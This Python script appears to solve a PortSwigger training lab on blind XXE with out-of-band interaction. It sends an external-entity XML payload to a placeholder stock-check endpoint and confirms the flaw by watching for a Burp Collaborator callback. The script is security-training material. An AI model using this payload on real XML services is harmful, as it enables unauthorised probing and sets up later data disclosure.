"""
Lab 3: Blind XXE with out-of-band interaction
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
Difficulty: Practitioner

📝 No reflection at all. Confirm exploitation purely by watching a
Burp Collaborator interaction land after sending this.
"""

from utils import get_session, log, note, build_oob_entity_xxe

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"
COLLABORATOR_URL = "http://YOUR-COLLABORATOR-ID.oastify.com"  # from Burp > Collaborator tab


def run():
    s = get_session()

    xml = build_oob_entity_xxe(COLLABORATOR_URL, extra_fields="<storeId>1</storeId>")
    note(f"Payload:\n{xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code} (expect a generic/blind response, no file content)")

    note("Now check Burp's Collaborator tab (or 'Poll now') for an incoming")
    note("DNS/HTTP interaction — that confirms the parser resolved our entity.")


if __name__ == "__main__":
    run()
